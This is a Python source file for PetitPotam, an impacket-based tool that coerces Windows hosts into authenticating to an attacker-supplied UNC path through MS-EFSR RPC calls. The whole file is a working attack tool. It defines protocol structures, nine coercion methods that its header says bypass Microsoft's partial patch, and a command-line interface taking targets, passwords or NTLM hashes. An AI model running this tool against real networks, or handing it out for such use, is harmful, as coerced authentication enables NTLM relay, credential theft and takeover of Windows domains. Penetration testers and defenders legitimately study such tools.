#!/usr/bin/python3
#
# PetitPotam
#
# Authors:
#   @ly4k (https://github.com/ly4k)
#
# Credit:
#   @topotam (https://github.com/topotam)
#
# Description:
#   Coerce authentication from Windows hosts via EFS-RPC
#
#   Microsoft released a patch for only two methods: EfsRpcOpenFileRaw and
#   EfsRpcEncryptFileSrv
#
#   This exploit implements the rest of the methods in the EFS protocol that allows
#   for authentication coercion.

import argparse
import logging
import random
import sys

from impacket import system_errors, version
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dtypes import (
    BOOL,
    DWORD,
    LPWSTR,
    NULL,
    PCHAR,
    RPC_SID,
    ULONG,
    WSTR,
)
from impacket.dcerpc.v5.ndr import NDRCALL, NDRPOINTERNULL, NDRSTRUCT
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.uuid import uuidtup_to_bin


class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return "EFSR SessionError: code: 0x%x - %s - %s" % (
                self.error_code,
                error_msg_short,
                error_msg_verbose,
            )
        else:
            return "EFSR SessionError: unknown error code: 0x%x" % self.error_code


################################################################################
# STRUCTURES
################################################################################
class EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):
    align = 1
    structure = (("Data", "20s"),)


class EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):
    align = 1
    structure = (("Data", "20s"),)


class EFS_EXIM_PIPE(NDRSTRUCT):
    align = 1
    structure = (("Data", ":"),)


class EFS_HASH_BLOB(NDRSTRUCT):

    structure = (
        ("Data", DWORD),
        ("cbData", PCHAR),
    )


class EFS_RPC_BLOB(NDRSTRUCT):

    structure = (
        ("Data", DWORD),
        ("cbData", PCHAR),
    )


class EFS_CERTIFICATE_BLOB(NDRSTRUCT):
    structure = (
        ("Type", DWORD),
        ("Data", DWORD),
        ("cbData", PCHAR),
    )


class ENCRYPTION_CERTIFICATE_HASH(NDRSTRUCT):
    structure = (
        ("Lenght", DWORD),
        ("SID", RPC_SID),
        ("Hash", EFS_HASH_BLOB),
        ("Display", LPWSTR),
    )


class ENCRYPTION_CERTIFICATE(NDRSTRUCT):
    structure = (
        ("Lenght", DWORD),
        ("SID", RPC_SID),
        ("Hash", EFS_CERTIFICATE_BLOB),
    )


class ENCRYPTION_CERTIFICATE_HASH_LIST(NDRSTRUCT):
    align = 1
    structure = (
        ("Cert", DWORD),
        ("Users", ENCRYPTION_CERTIFICATE_HASH),
    )


class ENCRYPTED_FILE_METADATA_SIGNATURE(NDRSTRUCT):
    structure = (
        ("Type", DWORD),
        ("HASH", ENCRYPTION_CERTIFICATE_HASH_LIST),
        ("Certif", ENCRYPTION_CERTIFICATE),
        ("Blob", EFS_RPC_BLOB),
    )


class EFS_RPC_BLOB(NDRSTRUCT):
    structure = (
        ("Data", DWORD),
        ("cbData", PCHAR),
    )


class ENCRYPTION_CERTIFICATE_LIST(NDRSTRUCT):
    align = 1
    structure = (("nUsers", DWORD), ("Users", NDRPOINTERNULL))


################################################################################
# RPC CALLS
################################################################################
class EfsRpcOpenFileRaw(NDRCALL):
    opnum = 0
    structure = (
        ("fileName", WSTR),
        ("Flag", ULONG),
    )


class EfsRpcOpenFileRawResponse(NDRCALL):
    structure = (
        ("hContext", EXIMPORT_CONTEXT_HANDLE),
        ("ErrorCode", ULONG),
    )


class EfsRpcEncryptFileSrv(NDRCALL):
    opnum = 4
    structure = (("FileName", WSTR),)


class EfsRpcEncryptFileSrvResponse(NDRCALL):
    structure = (("ErrorCode", ULONG),)


class EfsRpcDecryptFileSrv(NDRCALL):
    opnum = 5
    structure = (
        ("FileName", WSTR),
        ("Flag", ULONG),
    )


class EfsRpcDecryptFileSrvResponse(NDRCALL):
    structure = (("ErrorCode", ULONG),)


class EfsRpcQueryUsersOnFile(NDRCALL):
    opnum = 6
    structure = (("FileName", WSTR),)


class EfsRpcQueryUsersOnFileResponse(NDRCALL):
    structure = (("ErrorCode", ULONG),)


class EfsRpcQueryRecoveryAgents(NDRCALL):
    opnum = 7
    structure = (("FileName", WSTR),)


class EfsRpcQueryRecoveryAgentsResponse(NDRCALL):
    structure = (("ErrorCode", ULONG),)


class EfsRpcRemoveUsersFromFile(NDRCALL):
    opnum = 8
    structure = (("FileName", WSTR), ("Users", ENCRYPTION_CERTIFICATE_HASH_LIST))


class EfsRpcRemoveUsersFromFileResponse(NDRCALL):
    structure = (("ErrorCode", ULONG),)


class EfsRpcAddUsersToFile(NDRCALL):
    opnum = 9
    structure = (
        ("FileName", WSTR),
        ("EncryptionCertificates", ENCRYPTION_CERTIFICATE_LIST),
    )


class EfsRpcAddUsersToFileResponse(NDRCALL):
    structure = (("ErrorCode", ULONG),)


class EfsRpcFileKeyInfo(NDRCALL):
    opnum = 12
    structure = (
        ("FileName", WSTR),
        ("infoClass", DWORD),
    )


class EfsRpcFileKeyInfoResponse(NDRCALL):
    structure = (("ErrorCode", ULONG),)


class EfsRpcDuplicateEncryptionInfoFile(NDRCALL):
    opnum = 13
    structure = (
        ("SrcFileName", WSTR),
        ("DestFileName", WSTR),
        ("dwCreationDisposition", DWORD),
        ("dwAttributes", DWORD),
        ("RelativeSD", EFS_RPC_BLOB),
        ("bInheritHandle", BOOL),
    )


class EfsRpcDuplicateEncryptionInfoFileResponse(NDRCALL):
    structure = (("ErrorCode", ULONG),)


class EfsRpcAddUsersToFileEx(NDRCALL):
    opnum = 15
    structure = (
        ("dwFlags", DWORD),
        ("Reserved", NDRPOINTERNULL),
        ("FileName", WSTR),
        ("EncryptionCertificates", ENCRYPTION_CERTIFICATE_LIST),
    )


class EfsRpcAddUsersToFileExResponse(NDRCALL):
    structure = (("ErrorCode", ULONG),)


################################################################################
# OPNUMs and their corresponding structures
################################################################################
OPNUMS = {
    0: (EfsRpcOpenFileRaw, EfsRpcOpenFileRawResponse),
    4: (EfsRpcEncryptFileSrv, EfsRpcEncryptFileSrvResponse),
    5: (EfsRpcDecryptFileSrv, EfsRpcDecryptFileSrvResponse),
    6: (EfsRpcQueryUsersOnFile, EfsRpcQueryUsersOnFileResponse),
    7: (EfsRpcQueryRecoveryAgents, EfsRpcQueryRecoveryAgentsResponse),
    8: (EfsRpcRemoveUsersFromFile, EfsRpcRemoveUsersFromFileResponse),
    9: (EfsRpcAddUsersToFile, EfsRpcAddUsersToFileResponse),
    12: (EfsRpcFileKeyInfo, EfsRpcFileKeyInfoResponse),
    13: (EfsRpcDuplicateEncryptionInfoFile, EfsRpcDuplicateEncryptionInfoFileResponse),
    15: (EfsRpcAddUsersToFileEx, EfsRpcAddUsersToFileExResponse),
}

################################################################################
# HELPER FUNCTIONS
################################################################################
def checkNullString(string):
    if string == NULL:
        return string

    if string[-1:] != "\x00":
        return string + "\x00"
    else:
        return string


def hEfsRpcOpenFileRaw(dce, filename):
    request = EfsRpcOpenFileRaw()
    request["fileName"] = checkNullString(filename)
    request["Flag"] = 0
    return dce.request(request)


def hEfsRpcEncryptFileSrv(dce, filename):
    request = EfsRpcOpenFileRaw()
    request["fileName"] = checkNullString(filename)
    return dce.request(request)


def hEfsRpcDecryptFileSrv(dce, path):
    request = EfsRpcDecryptFileSrv()
    request["FileName"] = checkNullString(path)

    try:
        dce.request(request)
    except DCERPCSessionError as e:
        if e.error_code == system_errors.ERROR_INVALID_NAME:
            return True
        return False

    return True


def hEfsRpcQueryUsersOnFile(dce, path):
    request = EfsRpcQueryUsersOnFile()
    request["FileName"] = checkNullString(path)

    try:
        dce.request(request)
    except DCERPCSessionError as e:
        if e.error_code == system_errors.ERROR_SUCCESS:
            return True
        return False

    return True


def hEfsRpcQueryRecoveryAgents(dce, path):
    request = EfsRpcQueryRecoveryAgents()
    request["FileName"] = checkNullString(path)

    try:
        dce.request(request)
    except DCERPCSessionError as e:
        if e.error_code == system_errors.ERROR_SUCCESS:
            return True
        return False

    return True


def hEfsRpcRemoveUsersFromFile(dce, path):
    request = EfsRpcRemoveUsersFromFile()
    request["FileName"] = checkNullString(path)
    request["Users"] = NULL

    try:
        dce.request(request)
    except DCERPCSessionError as e:
        if e.error_code == system_errors.ERROR_INVALID_NAME:
            return True
        return False

    return True


def hEfsRpcAddUsersToFile(dce, path):
    request = EfsRpcAddUsersToFile()
    request["FileName"] = checkNullString(path)
    request["EncryptionCertificates"] = ENCRYPTION_CERTIFICATE_LIST()

    try:
        dce.request(request)
    except DCERPCSessionError as e:
        if e.error_code == system_errors.ERROR_INVALID_NAME:
            return True
        return False

    return True


def hEfsRpcFileKeyInfo(dce, path):
    request = EfsRpcFileKeyInfo()
    request["FileName"] = checkNullString(path)

    try:
        dce.request(request)
    except DCERPCSessionError as e:
        if e.error_code == system_errors.ERROR_SUCCESS:
            return True
        return False

    return True


def hEfsRpcDuplicateEncryptionInfoFile(dce, path):
    request = EfsRpcDuplicateEncryptionInfoFile()
    request["SrcFileName"] = checkNullString(path)
    request["DestFileName"] = "\0"
    request["RelativeSD"] = EFS_RPC_BLOB()

    try:
        dce.request(request)
    except DCERPCSessionError as e:
        if e.error_code == system_errors.ERROR_INVALID_NAME:
            return True
        return False

    return True


def hEfsRpcAddUsersToFileEx(dce, path):
    request = EfsRpcAddUsersToFileEx()
    request["FileName"] = checkNullString(path)
    request["EncryptionCertificates"] = ENCRYPTION_CERTIFICATE_LIST()

    try:
        dce.request(request)
    except DCERPCSessionError as e:
        if e.error_code == system_errors.ERROR_INVALID_NAME:
            return True
        return False

    return True


class PetitPotam:
    BINDINGS = {
        "lsarpc": {
            "stringbinding": r"ncacn_np:%s[\PIPE\lsarpc]",
            "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
        },
        "efsr": {
            "stringbinding": r"ncacn_np:%s[\PIPE\efsrpc]",
            "MSRPC_UUID_EFSR": ("df1941c5-fe89-4e79-bf10-463657acf44d", "1.0"),
        },
    }
    TECHNIQUES = {
        "EncryptFileSrv": hEfsRpcEncryptFileSrv,
        "DecryptFileSrv": hEfsRpcDecryptFileSrv,
        "QueryUsersOnFile": hEfsRpcQueryUsersOnFile,
        "QueryRecoveryAgents": hEfsRpcQueryRecoveryAgents,
        "RemoveUsersFromFile": hEfsRpcRemoveUsersFromFile,
        "AddUsersToFile": hEfsRpcAddUsersToFile,
        "FileKeyInfo": hEfsRpcFileKeyInfo,
        "DuplicateEncryptionInfoFile": hEfsRpcDuplicateEncryptionInfoFile,
        "AddUsersToFileEx": hEfsRpcAddUsersToFileEx,
    }

    def __init__(
        self,
        username="",
        password="",
        domain="",
        lmhash="",
        nthash="",
        do_kerberos=False,
        dc_host="",
        port=445,
        pipe="",
        target_name="",
        target_ip="",
    ):
        self.username = username
        self.password = password
        self.domain = domain
        self.lmhash = lmhash
        self.nthash = nthash
        self.do_kerberos = do_kerberos
        self.dc_host = dc_host
        self.port = port
        self.pipe = pipe
        self.target_name = target_name
        self.target_ip = target_ip

    def connect(self):
        # Connect and bind to MS-EFSR (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/1baaad2f-7a84-4238-b113-f32827a39cd2)
        stringbinding = self.BINDINGS[self.pipe]["stringbinding"] % self.target_name

        rpctransport = transport.DCERPCTransportFactory(stringbinding)

        rpctransport.set_credentials(
            self.username,
            self.password,
            self.domain,
            self.lmhash,
            self.nthash,
        )

        rpctransport.set_kerberos(self.do_kerberos, kdcHost=self.dc_host)

        rpctransport.setRemoteHost(self.target_ip)
        rpctransport.set_dport(self.port)

        dce = rpctransport.get_dce_rpc()

        logging.debug("Connecting to %s" % (repr(stringbinding)))

        try:
            # Connect to named pipe
            dce.connect()
        except Exception as e:
            logging.error("Failed to connect to pipe: %s" % e)
            sys.exit(1)

        logging.debug("Connected to %s" % (repr(stringbinding)))

        logging.debug(
            "Binding to %s" % repr(self.BINDINGS[self.pipe]["MSRPC_UUID_EFSR"])
        )

        try:
            # Bind to MSRPC MS-EFSR UUID: 12345678-1234-ABCD-EF00-0123456789AB
            dce.bind(uuidtup_to_bin(self.BINDINGS[self.pipe]["MSRPC_UUID_EFSR"]))
        except Exception as e:
            logging.error(
                "Failed to bind to %s: %s"
                % (str(self.BINDINGS[self.pipe]["MSRPC_UUID_EFSR"]), e)
            )
            sys.exit(1)

        logging.debug("Bound to %s" % repr(self.BINDINGS[self.pipe]["MSRPC_UUID_EFSR"]))

        return dce

    def exploit(self, path, method):
        dce = self.connect()

        if method.lower() == "random":
            logging.info("Choosing random method")
            method, func = random.choice(list(PetitPotam.TECHNIQUES.items()))
        else:
            func = PetitPotam.TECHNIQUES[method]

        logging.info("Using method: %s" % method)

        logging.info("Coercing authentication to: %s" % repr(path))
        if func(dce, path) == True:
            logging.info("Success!")
        else:
            logging.error("Failed.")


if __name__ == "__main__":
    print(version.BANNER)

    logger.init()

    parser = argparse.ArgumentParser(
        add_help=True,
        description="PetitPotam - Coerce authentication from Windows hosts",
    )
    parser.add_argument(
        "target",
        action="store",
        help="[[domain/]username[:password]@]<targetName or address>",
    )
    parser.add_argument(
        "path",
        action="store",
        help="UNC path for authentication",
    )

    parser.add_argument("-debug", action="store_true", help="Turn DEBUG output ON")

    group = parser.add_argument_group("connection")

    group.add_argument(
        "-port",
        action="store",
        choices=["139", "445"],
        nargs="?",
        default="445",
        metavar="destination port",
        help="Destination port to connect to MS-RPRN named pipe",
    )
    group.add_argument(
        "-pipe",
        action="store",
        choices=["efsr", "lsarpc"],
        metavar="pipe",
        default="lsarpc",
        help="Named pipe to use (default: lsarpc)",
    )

    group.add_argument(
        "-method",
        action="store",
        choices=["random", *list(map(lambda x: x[0], PetitPotam.TECHNIQUES.items()))],
        metavar="method",
        default="random",
        help="Method used for coercing authentication",
    )
    group.add_argument(
        "-target-ip",
        action="store",
        metavar="ip address",
        help=(
            "IP Address of the target machine. If "
            "ommited it will use whatever was specified as target. This is useful when "
            "target is the NetBIOS name and you cannot resolve it"
        ),
    )

    group = parser.add_argument_group("authentication")

    group.add_argument(
        "-hashes",
        action="store",
        metavar="LMHASH:NTHASH",
        help="NTLM hashes, format is LMHASH:NTHASH",
    )
    group.add_argument(
        "-no-pass", action="store_true", help="don't ask for password (useful for -k)"
    )
    group.add_argument(
        "-k",
        action="store_true",
        help="Use Kerberos authentication. Grabs credentials from ccache file "
        "(KRB5CCNAME) based on target parameters. If valid credentials "
        "cannot be found, it will use the ones specified in the command "
        "line",
    )
    group.add_argument(
        "-dc-ip",
        action="store",
        metavar="ip address",
        help=(
            "IP Address of the domain controller. If omitted it will use the domain "
            "part (FQDN) specified in the target parameter"
        ),
    )

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, target_name = parse_target(options.target)

    if domain is None:
        domain = ""

    if (
        password == ""
        and username != ""
        and options.hashes is None
        and options.no_pass is not True
    ):
        from getpass import getpass

        password = getpass("Password:")

    if options.hashes is not None:
        hashes = options.hashes.split(":")
        if len(hashes) == 1:
            (nthash,) = hashes
            lmhash = nthash = nthash
        else:
            lmhash, nthash = hashes
    else:
        nthash = lmhash = ""

    if options.target_ip is None:
        options.target_ip = target_name

    petit_potam = PetitPotam(
        username=username,
        password=password,
        domain=domain,
        lmhash=lmhash,
        nthash=nthash,
        do_kerberos=options.k,
        dc_host=options.dc_ip,
        port=int(options.port),
        pipe=options.pipe,
        target_name=target_name,
        target_ip=options.target_ip,
    )

    petit_potam.exploit(path=options.path, method=options.method)
